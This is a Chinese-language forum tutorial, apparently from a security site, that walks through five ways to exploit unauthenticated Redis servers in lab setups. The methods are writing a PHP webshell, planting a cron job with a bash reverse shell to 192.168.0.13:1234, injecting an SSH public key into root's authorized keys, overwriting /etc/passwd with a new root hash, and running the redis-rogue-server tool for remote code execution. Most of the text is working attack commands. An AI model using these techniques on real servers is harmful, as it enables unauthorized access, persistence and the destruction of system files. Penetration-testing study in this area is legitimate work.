
### 1、写Webshell

**条件：**

- 知道网站根目录的绝对路径
- 运行redis服务的用户必须有权限向目录写文件

**利用方法：**

将`dir`设置为`/www/wwwroot/html`，将指定本地数据库存放目录设置为`/www/wwwroot/html`；将`dbfilename`设置为文件名`shell.php`，即指定本地数据库文件名为`shell.php`；再执行`save`或`bgsave`，则我们就可以写入一个路径为`/www/wwwroot/html/shell.php`的Webshell文件。

首先我们在服务器的根目录中创建一个`/www/root`的文件夹并用`python`启动一个临时的HTTP服务。

![af1475d9f1f103e910620aa2fc2d9fa8.png](https://bbs.kanxue.com/upload/attach/202205/809626_WKTYRE6MPRJFRZ2.jpg)

![272537a2f42c31afc64789867dedab50.png](https://bbs.kanxue.com/upload/attach/202205/809626_UDDD8CA4K8MW9JA.jpg)

获取当前路径：

```
config get dir
```

![6b1e3f33c6f02d3a8127bda015208f1b.png](https://bbs.kanxue.com/upload/attach/202205/809626_SM5K4UQF9BQXQC3.jpg)

设置`/www/root`为指定目录：

```
config set dir /www/root
```

![fbc64a7b04e544861cdde6baa97f5340.png](https://bbs.kanxue.com/upload/attach/202205/809626_7UYY9NSJ5NY6877.jpg)

写入文件：

```
set abc "\n\n<?php phpinfo();?>"
```

另一种写法是`set abc "\n\n<xxx>" nx`，末尾的`nx`代表仅当键`abc`不存在的时候，才会创建。这样可以防止误更新到业务在用的键名，引发业务的异常。

![0d969ddf3638f496a2f2b455c1894a04.png](https://bbs.kanxue.com/upload/attach/202205/809626_8FKNHNA6FBB79GN.jpg)

设置写文件：

```
config set dbfilename test.php
```

![84bc3d0f5211628c701d0d619c2303c3.png](https://bbs.kanxue.com/upload/attach/202205/809626_5KVR6T84B976GMU.jpg)

随后尝试访问：

![64d624bb049006cbbf9030cde63fa833.png](https://bbs.kanxue.com/upload/attach/202205/809626_4EERF3TQSVTB3F7.jpg)

这里是肯定不会解析的，因为只是一个HTTP服务，可以看到目录下也有`test.php`，成功写入。

![1033763cb9e30316eb42790a1078fecc.png](https://bbs.kanxue.com/upload/attach/202205/809626_FXFFKFPN3XMKNPH.jpg)

ps: 来自Tatsumaki大佬的博客

### 2、写Crontab

**条件：**

- 访问目标服务器的redis不需要密码
- redis对`/var/spool/cron`有写入权限

#### Ubuntu

```
config set dir /var/spool/cron
set abcd "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.13/1234 0>&1\n\n"
config set filename root
save
```

![29692b5557d111b1eec89f07d1fb1f1d.png](https://bbs.kanxue.com/upload/attach/202205/809626_7RDY5RYZKA8PK8K.jpg)

![b1e591a3868475ba6d60ba306391ca92.png](https://bbs.kanxue.com/upload/attach/202205/809626_5NCDQSFMMSCHSBM.jpg)

在Ubuntu中尝试之后，发现并没有反弹shell回来，不知道为什么，查询了文章看到有大佬说：

这个方法只能在Centos上使用，Ubuntu上是行不通的，原因如下：

因为默认redis写文件后是`644`的权限，但Ubuntu要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是`600`也就是`-rw-------`才会执行，否则会报错`(root) INSECURE MODE (mode 0600 expected)`，而Centos的定时任务文件`/var/spool/cron/<username>`权限`644`也能执行。

所以这里更换Centos尝试，搭建步骤与上文一致，发现Centos确实在1分钟左右就返回了shell。

![829eec0c5f1b10bb4b0e61ef1e2d0049.png](https://bbs.kanxue.com/upload/attach/202205/809626_RH983F39K3ZTQPK.jpg)

按照上面CentOs和Ubuntu写文件的说法，可以来看一下写入的文件权限大小。

Linux权限对应表：

![df829a15ae7a3bba86db528db9524304.png](https://bbs.kanxue.com/upload/attach/202205/809626_KZ722YQZGCT4Q8G.jpg)

![3ea7002d30a08934d5044c54b9a6f343.png](https://bbs.kanxue.com/upload/attach/202205/809626_7RR6N2J5D4ZJMYB.jpg)

可以看到CentOs中的是`644`。

![e31a42b4b0863c997a81011a5856843f.png](https://bbs.kanxue.com/upload/attach/202205/809626_AM4M3SK7VGSXF2T.jpg)

Ubuntu中也是`644`，那么如果真如那篇文章所说，必须是`600`才会执行的话，那么确实Ubuntu无法执行。

### 3、写SSH公钥

**条件：**

- Redis服务使用root启动
- 服务器开启了SSH，但是允许密钥登录

这里就用Centos7搭建的redis作为环境。

首先配置`ssh`密钥登录：

```
vi /etc/ssh/sshd_config

RSAAuthentication yes  # 开启密钥登入的认证方式
PubkeyAuthentication yes  # 开启密钥登入的认证方式
PermitRootLogin yes  # 此处请留意 root 用户能否通过 SSH 登录，默认为yes
# 可以正常用密钥登录了，再把这里改为no
PasswordAuthentication yes  #当我们完成全部设置并以密钥方式登录成功后，可以禁用密码登录。这里我们先不禁用，先允许密码登陆
```

![62b64f1e2b3777bee65fa638073bfdf1.png](https://bbs.kanxue.com/upload/attach/202205/809626_XC76P9QJMGHE6KH.jpg)

然后重启`sshd`服务：

```
systemctl restart sshd
```

随后尝试连接会提示：

![c0bf8661c2f54e3b0fc9dd79993555b2.png](https://bbs.kanxue.com/upload/attach/202205/809626_84YHW64AJW93K6V.jpg)

随后在Mac上生成密钥：

```
ssh-keygen -t rsa
```

设置`.ssh`目录：

```
config set dir /root/.ssh/
```

写入公钥：

```
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.0.148 -x set xxx   # Mac
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > ./key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.0.148 -x set xxx
```

![8cd7c5fdb6fd92634bfb8f8e7b126930.png](https://bbs.kanxue.com/upload/attach/202205/809626_BPMGMHX4CH58ADC.jpg)

随后就可以使用`ssh`直接连接了。

![e30c2cd9ed76c300db3bc6aa4451fd32.png](https://bbs.kanxue.com/upload/attach/202205/809626_C23FY5UAACJADBG.jpg)

### 4、重置Linux账户密码

**原理：**

若`/etc/passwd`和`/etc/shadow`中同时存在密码，系统会使用`/etc/passwd`中的密码进行验证。`/etc/passwd-`是`/etc/passwd`的备份，成功登录系统后，通过替换`/etc/passwd-`文件，可以恢复root用户的原密码。

Linux存账户密码一般会有`/etc/passwd`和`/etc/shadow`，如果两个出现冲突的话，会以`/etc/passwd`为准。

另外，`/etc/passwd`的权限一般是`644`，比`/etc/shadow`的`640`要高。而且，redis写入是覆盖的，也就是说，写入进去覆盖之后，其他的都没了，这个过程是有创且不可逆的。

这里用到一个大佬的dockerfile: [6c5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6B7N6i4y4@1L8$3&6D9P5e0q4Q4x3V1k6p5L8$3y4C8k6i4u0d9k6h3c8A6M7H3`.`.](https://bbs.kanxue.com/elink@9efK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6B7N6i4y4@1L8$3&6D9P5e0q4Q4x3V1k6p5L8$3y4C8k6i4u0d9k6h3c8A6M7H3`.`.)

或者docker直接下载也可以：

```
docker pull ju5ton1y/redis:latest
docker run -itd -p 6379:6379 -p 6378:22 ju5ton1y/redis:latest
# 启动之后需要进入容器
/etc/init.d/ssh restart
```

![8c0cc21bca1ca8576346b1f97179f335.png](https://bbs.kanxue.com/upload/attach/202205/809626_3KDQVCSHV5JU5DF.jpg)

![b975fbdc60254eba78f10d31a58404ff.png](https://bbs.kanxue.com/upload/attach/202205/809626_D2X6DSWUWM4PYH5.jpg)

随后生成一串密码为`YourNewPasswd%1024`的密文。

另外这段代码：

```
python -c 'import crypt; print crypt.crypt("YourNewPasswd%1024","$6$my0salt0")'
```

mac下会这样：

![a35d15e21877f46dded9b9303d4ad4dd.png](https://bbs.kanxue.com/upload/attach/202205/809626_JBC3KKYHQ9SJGG5.jpg)

在kali下就好了：

![eafff4d578885f1f23347729955d9eea.png](https://bbs.kanxue.com/upload/attach/202205/809626_TKCTRUE5T9KBE2V.jpg)

然后写入`/etc/passwd`：

```
SET abcd "\n\n root:$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.:0:0:root:/root:/bin/bash\nsshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n"
```

然后：

```
config set dbfilename passwd
save
```

然后就可以使用`YourNewPasswd%1024`这个密码登录了。

![3ecd53aa41b8f3d08cf67e75165af515.png](https://bbs.kanxue.com/upload/attach/202205/809626_W3NXTWXQRHBVREW.jpg)

### 5、主从备份

这里用vulhub的靶场：

```
git clone https://github.com/vulhub/vulhub.git
cd redis/4-unacc/
docker-compose up -d
```

![da717cd0c076c9d146f2c7910ad5a60e.png](https://bbs.kanxue.com/upload/attach/202205/809626_YDC7956FN2KJ4DC.jpg)

![c4386984ffcb3c010408d4e2eb90ee3d.png](https://bbs.kanxue.com/upload/attach/202205/809626_2CQR96U2Z7DRXB6.jpg)

exp用这个[0deK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1x3r3t1H3k6s2W2o6e0W2)9J5c8Y4u0W2k6r3W2K6i4K6u0V1M7X3!0Y4N6h3g2Q4x3X3c8K6k6i4u0$3k6i4u0Q4x3X3g2Y4K9i4b7`](https://bbs.kanxue.com/elink@0deK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1x3r3t1H3k6s2W2o6e0W2)9J5c8Y4u0W2k6r3W2K6i4K6u0V1M7X3!0Y4N6h3g2Q4x3X3c8K6k6i4u0$3k6i4u0Q4x3X3g2Y4K9i4b7`.

```
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
python3 redis-rogue-server.py --rhost 192.168.0.13 --lhost 192.168.0.139
# rhost是redis，lhost是kali
```

这执行的时候会遇到错误：

![49b76596a0ffde61e70c7e5ce4afb020.png](https://bbs.kanxue.com/upload/attach/202205/809626_6W6DWTNKVD5Q8T2.jpg)

![4b42cd5655b94ad27ec9cbff9b88cb39.png](https://bbs.kanxue.com/upload/attach/202205/809626_X9XNHRUDUX7VXMP.jpg)

多跑几次就行。
